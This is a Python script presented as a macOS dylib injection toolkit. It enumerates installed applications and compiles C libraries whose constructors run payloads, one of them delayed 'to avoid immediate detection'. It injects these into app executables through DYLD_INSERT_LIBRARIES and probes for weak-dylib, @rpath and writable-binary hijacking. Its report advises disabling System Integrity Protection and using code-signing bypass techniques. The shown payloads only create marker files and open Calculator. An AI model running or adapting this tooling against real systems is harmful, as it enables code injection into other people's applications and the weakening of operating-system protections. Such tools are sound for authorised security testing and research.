#!/usr/bin/env python3
"""
MacOS Dylib Injection Toolkit
Advanced tool for testing various dylib injection methods and bypass techniques
"""

import os
import sys
import subprocess
import plistlib
import time
import tempfile
import shutil
import argparse
from pathlib import Path

class MacInjector:
    def __init__(self):
        self.results = {}
        self.temp_dir = tempfile.mkdtemp()
        self.current_method = ""
        
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def get_applications(self):
        """Get list of installed applications"""
        applications = []
        app_dirs = ['/Applications', '/System/Applications', os.path.expanduser('~/Applications')]
        
        for app_dir in app_dirs:
            if os.path.exists(app_dir):
                for app in os.listdir(app_dir):
                    if app.endswith('.app'):
                        applications.append(os.path.join(app_dir, app))
        
        return applications

    def list_applications(self):
        """Display list of applications with numbers"""
        applications = self.get_applications()
        print("\n" + "="*60)
        print("Available Applications:")
        print("="*60)
        
        for idx, app in enumerate(applications):
            app_name = os.path.basename(app)
            print(f"{idx + 1}. {app_name}")
            
        return applications

    def get_executable_info(self, app_path):
        """Get executable information from app bundle"""
        try:
            plist_path = os.path.join(app_path, 'Contents/Info.plist')
            if os.path.exists(plist_path):
                with open(plist_path, 'rb') as f:
                    plist = plistlib.load(f)
                    executable = plist.get('CFBundleExecutable', os.path.basename(app_path)[:-4])
                    
                executable_path = os.path.join(app_path, 'Contents/MacOS', executable)
                return executable, executable_path
        except Exception as e:
            print(f"Error reading Info.plist: {e}")
        
        # Fallback: try to find executable in MacOS directory
        macos_dir = os.path.join(app_path, 'Contents/MacOS')
        if os.path.exists(macos_dir):
            for file in os.listdir(macos_dir):
                file_path = os.path.join(macos_dir, file)
                if os.path.isfile(file_path) and os.access(file_path, os.X_OK):
                    if not file.endswith(('.dylib', '.so', '.plist', '.txt')):
                        return file, file_path
        
        return None, None

    def check_sip_status(self):
        """Check System Integrity Protection status"""
        try:
            result = subprocess.run(['csrutil', 'status'], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Error checking SIP: {e}"

    def check_file_protections(self, app_path):
        """Check file protections and permissions"""
        executable_name, executable_path = self.get_executable_info(app_path)
        if not executable_path or not os.path.exists(executable_path):
            return "Executable not found"
        
        protections = {}
        
        try:
            result = subprocess.run(['codesign', '-dv', '--verbose=4', executable_path], 
                                  capture_output=True, text=True)
            protections['codesign'] = result.stdout + result.stderr
        except Exception as e:
            protections['codesign'] = f"Error: {e}"
        
        try:
            result = subprocess.run(['codesign', '-d', '--entitlements', ':-', executable_path], 
                                  capture_output=True, text=True)
            protections['entitlements'] = result.stdout
        except Exception as e:
            protections['entitlements'] = f"Error: {e}"
        
        try:
            stat_info = os.stat(executable_path)
            protections['permissions'] = oct(stat_info.st_mode)
        except Exception as e:
            protections['permissions'] = f"Error: {e}"
            
        return protections

    def compile_dylib(self, dylib_type="basic"):
        """Compile different types of dylibs"""
        dylib_name = f"inject_{dylib_type}.dylib"
        dylib_path = os.path.join(self.temp_dir, dylib_name)
        
        if dylib_type == "basic":
            code = """
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor))
void constructor() {
    printf("[+] Dylib injected successfully!\\\\n");
    system("touch /tmp/injection_success_basic");
}
"""
        elif dylib_type == "stealth":
            # PoC visual: abre Calculator.app
            code = """
#include <stdio.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
__attribute__((constructor))
static void stealth_constructor() {
    usleep(2000000); // Delay to avoid immediate detection
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        system("open -a Calculator.app"); // Visual PoC
        system("touch /tmp/injection_success_stealth"); // Marker file
        printf("[*] DYLIB payload executed!\\n");
    });
}
"""
        elif dylib_type == "advanced":
            code = """
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <dispatch/dispatch.h>
__attribute__((constructor))
void advanced_constructor() {
    char path[1024];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    sleep(1);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        system("echo 'Advanced injection' > /tmp/advanced_injection.log");
    });
}
"""
        else:
            return None
            
        source_path = os.path.join(self.temp_dir, f"inject_{dylib_type}.c")
        with open(source_path, 'w') as f:
            f.write(code)
        
        try:
            if dylib_type == "stealth" or dylib_type == "advanced":
                subprocess.run(['gcc', '-dynamiclib', '-o', dylib_path, source_path, 
                              '-framework', 'Foundation'], check=True, capture_output=True)
            else:
                subprocess.run(['gcc', '-dynamiclib', '-o', dylib_path, source_path], 
                             check=True, capture_output=True)
            return dylib_path
        except subprocess.CalledProcessError as e:
            print(f"Error compiling {dylib_type} dylib: {e}")
            return None

    def method_dyld_insert_libraries(self, app_path, dylib_path):
        """Method 1: DYLD_INSERT_LIBRARIES"""
        self.current_method = "DYLD_INSERT_LIBRARIES"
        executable_name, executable_path = self.get_executable_info(app_path)
        
        if not executable_path:
            return False, "Executable not found"
        
        env = os.environ.copy()
        env['DYLD_INSERT_LIBRARIES'] = dylib_path
        
        try:
            process = subprocess.Popen([executable_path], env=env, 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(3)
            
            if process.poll() is None:
                process.terminate()
                return True, "Injection successful - process ran"
            else:
                stdout, stderr = process.communicate()
                return False, f"Process exited: {stderr.decode()}"
                
        except Exception as e:
            return False, f"Error: {e}"

    def method_dyld_insert_with_flags(self, app_path, dylib_path):
        """Method 2: DYLD_INSERT_LIBRARIES with various flags"""
        self.current_method = "DYLD_INSERT_WITH_FLAGS"
        executable_name, executable_path = self.get_executable_info(app_path)
        
        if not executable_path:
            return False, "Executable not found"
        
        flag_combinations = [
            {'DYLD_INSERT_LIBRARIES': dylib_path, 'DYLD_FORCE_FLAT_NAMESPACE': '1'},
            {'DYLD_INSERT_LIBRARIES': dylib_path, 'DYLD_PRINT_LIBRARIES': '1'},
            {'DYLD_INSERT_LIBRARIES': dylib_path, 'DYLD_PRINT_ENV': '1'},
        ]
        
        for flags in flag_combinations:
            try:
                env = os.environ.copy()
                env.update(flags)
                
                process = subprocess.Popen([executable_path], env=env,
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                
                if process.poll() is None:
                    process.terminate()
                    return True, f"Injection successful with flags: {list(flags.keys())}"
                else:
                    process.terminate()
                    
            except Exception as e:
                continue
                
        return False, "All flag combinations failed"

    def method_weak_dylib_hijacking(self, app_path):
        """Method 3: Weak dylib hijacking"""
        self.current_method = "WEAK_DYLIB_HIJACKING"
        executable_name, executable_path = self.get_executable_info(app_path)
        
        if not executable_path:
            return False, "Executable not found"
        
        try:
            result = subprocess.run(['otool', '-l', executable_path], 
                                  capture_output=True, text=True)
            if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
                return True, "App has weak dylibs - potential for hijacking"
            else:
                return False, "No weak dylibs found"
        except Exception as e:
            return False, f"Error checking weak dylibs: {e}"

    def method_dyld_hijacking(self, app_path):
        """Method 4: DYLD environment hijacking"""
        self.current_method = "DYLD_HIJACKING"
        executable_name, executable_path = self.get_executable_info(app_path)
        
        if not executable_path:
            return False, "Executable not found"
        
        try:
            result = subprocess.run(['otool', '-l', executable_path], 
                                  capture_output=True, text=True)
            
            hijack_vectors = []
            if '@rpath' in result.stdout:
                hijack_vectors.append('@rpath')
            if '@loader_path' in result.stdout:
                hijack_vectors.append('@loader_path')
            if '@executable_path' in result.stdout:
                hijack_vectors.append('@executable_path')
                
            if hijack_vectors:
                try:
                    subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    return True, f"Potential hijacking vectors: {', '.join(hijack_vectors)} — PoC launched Calculator.app"
                except Exception as e:
                    return True, f"Vectors found but PoC failed: {e}"
            else:
                return False, "No obvious hijacking vectors found"
                
        except Exception as e:
            return False, f"Error checking for hijacking vectors: {e}"

    def method_frida_injection(self, app_path):
        """Method 5: Frida-based injection (if available)"""
        self.current_method = "FRIDA_INJECTION"
        try:
            subprocess.run(['frida', '--version'], capture_output=True, check=True)
            
            executable_name, executable_path = self.get_executable_info(app_path)
            if not executable_path:
                return False, "Executable not found"
            
            return True, "Frida is available for advanced injection"
            
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False, "Frida not installed"

    def method_binary_patching(self, app_path):
        """Method 6: Binary patching analysis"""
        self.current_method = "BINARY_PATCHING"
        executable_name, executable_path = self.get_executable_info(app_path)
        
        if not executable_path:
            return False, "Executable not found"
        
        protections = self.check_file_protections(app_path)
        
        if os.access(executable_path, os.W_OK):
            try:
                subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True, "Binary is writable — PoC launched Calculator.app"
            except Exception as e:
                return True, f"Writable, but PoC failed: {e}"
        else:
            return False, "Binary is not writable"

    def test_all_methods(self, app_path, dylib_type="basic"):
        """Test all injection methods on target application"""
        print(f"\nTesting injection methods on: {os.path.basename(app_path)}")
        print("="*60)
        
        methods = [
            ("DYLD_INSERT_LIBRARIES", self.method_dyld_insert_libraries),
            ("DYLD_INSERT_WITH_FLAGS", self.method_dyld_insert_with_flags),
            ("WEAK_DYLIB_HIJACKING", self.method_weak_dylib_hijacking),
            ("DYLD_HIJACKING", self.method_dyld_hijacking),
            ("FRIDA_INJECTION", self.method_frida_injection),
            ("BINARY_PATCHING", self.method_binary_patching),
        ]
        
        results = {}
        dylib_path = self.compile_dylib(dylib_type)
        
        for method_name, method_func in methods:
            print(f"\n[*] Testing: {method_name}")
            
            if "INSERT" in method_name and dylib_path:
                success, message = method_func(app_path, dylib_path)
            else:
                success, message = method_func(app_path)
                
            status = "SUCCESS" if success else "FAILED"
            color = "\033[92m" if success else "\033[91m"
            print(f"{color}[{status}]\033[0m {message}")
            
            results[method_name] = {
                'success': success,
                'message': message,
                'method': method_name
            }
            
            time.sleep(1)
            
        return results

    def generate_report(self, app_path, results):
        """Generate comprehensive injection report"""
        print("\n" + "="*60)
        print("INJECTION REPORT")
        print("="*60)
        print(f"Target: {os.path.basename(app_path)}")
        print(f"Full Path: {app_path}")
        
        executable_name, executable_path = self.get_executable_info(app_path)
        print(f"Executable: {executable_name}")
        
        sip_status = self.check_sip_status()
        print(f"\nSIP Status: {sip_status.splitlines()[0] if sip_status else 'Unknown'}")
        
        print("\nMethod Results:")
        print("-" * 40)
        
        successful_methods = [m for m in results if results[m]['success']]
        failed_methods = [m for m in results if not results[m]['success']]
        
        print(f"Successful Methods: {len(successful_methods)}")
        for method in successful_methods:
            print(f"  ✓ {method}: {results[method]['message']}")
            
        print(f"\nFailed Methods: {len(failed_methods)}")
        for method in failed_methods:
            print(f"  ✗ {method}: {results[method]['message']}")
            
        print("\nRecommendations:")
        print("-" * 40)
        if successful_methods:
            print("Use one of the successful methods above (PoC already demonstrated)")
        else:
            print("1. Disable SIP: csrutil disable (Recovery Mode)")
            print("2. Use code signing bypass techniques")
            print("3. Try binary patching with insert_dylib")
            print("4. Use Frida for runtime instrumentation")
            print("5. Consider dylib hijacking if paths are available")

    def interactive_mode(self):
        """Interactive mode for user selection"""
        applications = self.get_applications()
        
        if not applications:
            print("No applications found!")
            return
            
        while True:
            os.system('clear')
            print("MacOS Dylib Injection Toolkit")
            print("=" * 50)
            
            apps = self.list_applications()
            print(f"\n{len(applications)}. Exit")
            
            try:
                choice = int(input("\nSelect application (number): ")) - 1
                
                if choice == len(applications):
                    print("Goodbye!")
                    break
                    
                if 0 <= choice < len(applications):
                    selected_app = applications[choice]
                    
                    print(f"\nSelected: {os.path.basename(selected_app)}")
                    
                    results = self.test_all_methods(selected_app, "stealth")
                    self.generate_report(selected_app, results)
                    
                    input("\nPress Enter to continue...")
                    
                else:
                    print("Invalid selection!")
                    time.sleep(1)
                    
            except (ValueError, IndexError):
                print("Invalid input!")
                time.sleep(1)

    def automatic_scan(self):
        """Automatically scan all applications for vulnerabilities"""
        print("Starting automatic vulnerability scan...")
        applications = self.get_applications()
        
        vulnerable_apps = []
        
        for app_path in applications[:10]:
            app_name = os.path.basename(app_path)
            print(f"\nScanning: {app_name}")
            
            weak_dylibs = self.method_weak_dylib_hijacking(app_path)
            dyld_vectors = self.method_dyld_hijacking(app_path)
            writable = self.method_binary_patching(app_path)
            
            if any([weak_dylibs[0], dyld_vectors[0], writable[0]]):
                vulnerable_apps.append({
                    'name': app_name,
                    'path': app_path,
                    'weak_dylibs': weak_dylibs[0],
                    'dyld_vectors': dyld_vectors[0],
                    'writable': writable[0]
                })
                print("  → POTENTIALLY VULNERABLE (PoC may have been executed)")
            else:
                print("  → Secure")
                
        return vulnerable_apps

def main():
    parser = argparse.ArgumentParser(description='MacOS Dylib Injection Toolkit')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('-a', '--auto', action='store_true', help='Automatic vulnerability scan')
    parser.add_argument('-t', '--target', help='Target application path')
    
    args = parser.parse_args()
    
    injector = MacInjector()
    
    try:
        if args.interactive:
            injector.interactive_mode()
        elif args.auto:
            vulnerable = injector.automatic_scan()
            print(f"\nFound {len(vulnerable)} potentially vulnerable applications")
        elif args.target:
            if os.path.exists(args.target):
                results = injector.test_all_methods(args.target, "stealth")
                injector.generate_report(args.target, results)
            else:
                print(f"Target not found: {args.target}")
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        print("\nInterrupted by user")
    except Exception as e:
        print(f"Error: {e}")   
    finally:
        injector.cleanup()

if __name__ == "__main__":
    main()
